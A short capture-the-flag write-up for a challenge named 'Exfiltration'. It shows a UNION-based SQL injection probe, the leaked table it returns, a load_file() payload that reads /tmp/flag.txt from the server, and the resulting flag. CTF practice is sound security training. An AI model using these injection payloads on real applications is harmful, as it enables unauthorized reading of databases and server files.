# Exfiltration

## Description

The power of CTF clout compels you to solve this challenge and aquire the flag

Note: The flag is located at `/tmp/flag.txt`

## Dev notes

Start: `make run`<br>
Stop: `make stop`

## Solution
This seems to be SQLi as there's a database of some sort.
Trying the payload
```
%' UNION SELECT 1,2,3,'
```
Shows another row in the table with 1,2,3,% as the entries:
```
Username	Phone	Email	ID Number
admin	123-456-7890	TacEx@root.lmao	001
nwhn	420-420-lmao	pwnsimp@lmao.dev	002
1	2	3	%
```

Googling "sql injection read file" shows this exploit-db page that explains how to do just that using load_file(): https://www.exploit-db.com/papers/14635.

The following payload gets the flag:
```
' UNION SELECT load_file('/tmp/flag.txt'),2,3,4 #
```

```
gigem{l3aky_d4t4bas3} 
```
